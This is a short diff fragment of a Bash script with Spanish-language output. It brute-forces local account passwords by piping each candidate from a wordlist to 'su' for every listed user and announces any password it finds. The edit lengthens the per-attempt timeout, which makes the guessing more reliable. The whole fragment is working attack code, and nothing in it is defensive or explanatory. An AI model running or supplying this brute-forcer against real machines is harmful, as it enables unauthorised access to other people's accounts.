@@ -45,7 +45,7 @@ intentos=0
 while IFS= read -r pass; do
   while IFS= read -r user; do
     echo -e "${verde}[${rojo}*${verde}]${rojo} Probando... $intentos${amarillo}/${rojo}$lineas${reset}"
-    if timeout 0.073 bash -c "echo '$pass' | su $user" > /dev/null 2>&1; then
+    if timeout 0.5 bash -c "echo '$pass' | su $user" > /dev/null 2>&1; then
       clear
       echo -e "${verde}[${rojo}✓${verde}]${amarillo} Contraseña ${rojo}$pass${amarillo} encontrada para el usuario ${rojo}$user${reset}"
       rm ./users.txt
